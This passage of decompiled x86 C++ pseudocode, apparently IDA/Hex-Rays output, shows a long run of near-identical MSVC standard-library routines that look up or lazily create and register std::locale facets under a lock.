  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB8C;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB8C;
  v2 = std::locale::id::operator unsigned int(&unk_4FFB28);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_4377EA((_Collvec **)&v6, (int)a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB8C = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB8C: using guessed type int dword_4FFB8C;
// 435B53: using guessed type char var_14[4];

//----- (00435BE8) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_435BE8(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB58;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB58;
  v2 = std::locale::id::operator unsigned int(&unk_4FFB00);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_43788C((_Collvec **)&v6, (int)a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB58 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB58: using guessed type int dword_4FFB58;
// 435BE8: using guessed type char var_14[4];

//----- (00435C7D) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_435C7D(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB7C;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB7C;
  v2 = std::locale::id::operator unsigned int(&unk_4FFA24);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( std::ctype<wchar_t>::_Getcat((int)&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB7C = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB7C: using guessed type int dword_4FFB7C;
// 435C7D: using guessed type char var_14[4];

//----- (00435D12) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_435D12(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB48;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB48;
  v2 = std::locale::id::operator unsigned int(&unk_4FFA30);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( std::ctype<wchar_t>::_Getcat((int)&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB48 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB48: using guessed type int dword_4FFB48;
// 435D12: using guessed type char var_14[4];

//----- (00435DA7) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_435DA7(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB90;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB90;
  v2 = std::locale::id::operator unsigned int(&unk_4FFB2C);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_437A0E(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB90 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB90: using guessed type int dword_4FFB90;
// 435DA7: using guessed type char var_14[4];

//----- (00435E3C) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_435E3C(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB5C;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB5C;
  v2 = std::locale::id::operator unsigned int(&unk_4FFB04);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_437A76(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB5C = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB5C: using guessed type int dword_4FFB5C;
// 435E3C: using guessed type char var_14[4];

//----- (00435ED1) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_435ED1(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB94;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB94;
  v2 = std::locale::id::operator unsigned int(&unk_4FFB30);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_437ADE(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB94 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB94: using guessed type int dword_4FFB94;
// 435ED1: using guessed type char var_14[4];

//----- (00435F66) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_435F66(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB60;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB60;
  v2 = std::locale::id::operator unsigned int(&unk_4FFB08);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_437B46(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB60 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB60: using guessed type int dword_4FFB60;
// 435F66: using guessed type char var_14[4];

//----- (00435FFD) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_435FFD(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB98;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB98;
  v2 = std::locale::id::operator unsigned int(&unk_4FFB34);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_437BAE(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB98 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB98: using guessed type int dword_4FFB98;
// 435FFD: using guessed type char var_14[4];

//----- (00436092) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_436092(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB64;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB64;
  v2 = std::locale::id::operator unsigned int(&unk_4FFB0C);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_437C16(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB64 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB64: using guessed type int dword_4FFB64;
// 436092: using guessed type char var_14[4];

//----- (00436127) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_436127(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFBA0;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFBA0;
  v2 = std::locale::id::operator unsigned int(&unk_4FFB3C);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_437C7E(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFBA0 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFBA0: using guessed type int dword_4FFBA0;
// 436127: using guessed type char var_14[4];

//----- (004361BC) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_4361BC(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB9C;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB9C;
  v2 = std::locale::id::operator unsigned int(&unk_4FFB38);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_437D02(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB9C = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB9C: using guessed type int dword_4FFB9C;
// 4361BC: using guessed type char var_14[4];

//----- (00436251) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_436251(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB6C;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB6C;
  v2 = std::locale::id::operator unsigned int(&unk_4FFB14);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_437D87(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB6C = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB6C: using guessed type int dword_4FFB6C;
// 436251: using guessed type char var_14[4];

//----- (004362E6) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_4362E6(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB68;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB68;
  v2 = std::locale::id::operator unsigned int(&unk_4FFB10);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_437E0B(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB68 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB68: using guessed type int dword_4FFB68;
// 4362E6: using guessed type char var_14[4];

//----- (0043637B) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_43637B(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB80;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB80;
  v2 = std::locale::id::operator unsigned int(&unk_4FFB1C);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_437E90(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB80 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB80: using guessed type int dword_4FFB80;
// 43637B: using guessed type char var_14[4];

//----- (00436410) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_436410(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB4C;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB4C;
  v2 = std::locale::id::operator unsigned int(&unk_4FFAF4);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_437EF8(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB4C = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB4C: using guessed type int dword_4FFB4C;
// 436410: using guessed type char var_14[4];

//----- (004364A5) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_4364A5(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB84;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB84;
  v2 = std::locale::id::operator unsigned int(&unk_4FFB20);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_437F60(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB84 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB84: using guessed type int dword_4FFB84;
// 4364A5: using guessed type char var_14[4];

//----- (0043653A) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_43653A(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB50;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB50;
  v2 = std::locale::id::operator unsigned int(&unk_4FFAF8);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_437FC8(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB50 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB50: using guessed type int dword_4FFB50;
// 43653A: using guessed type char var_14[4];

//----- (004365CF) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_4365CF(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB88;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB88;
  v2 = std::locale::id::operator unsigned int(&unk_4FFB24);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_438030(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB88 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB88: using guessed type int dword_4FFB88;
// 4365CF: using guessed type char var_14[4];

//----- (00436664) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_436664(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB54;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB54;
  v2 = std::locale::id::operator unsigned int(&unk_4FFAFC);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_4380AB(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB54 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB54: using guessed type int dword_4FFB54;
// 436664: using guessed type char var_14[4];

//----- (004366F9) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_4366F9(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFBA4;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFBA4;
  v2 = std::locale::id::operator unsigned int(&unk_4FFB40);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_438126(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFBA4 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFBA4: using guessed type int dword_4FFBA4;
// 4366F9: using guessed type char var_14[4];

//----- (0043678E) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_43678E(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFB70;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFB70;
  v2 = std::locale::id::operator unsigned int(&unk_4FFB18);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_438192(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFB70 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFB70: using guessed type int dword_4FFB70;
// 43678E: using guessed type char var_14[4];

//----- (00436823) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_436823(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFBA8;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFBA8;
  v2 = std::locale::id::operator unsigned int(&unk_4FFB44);
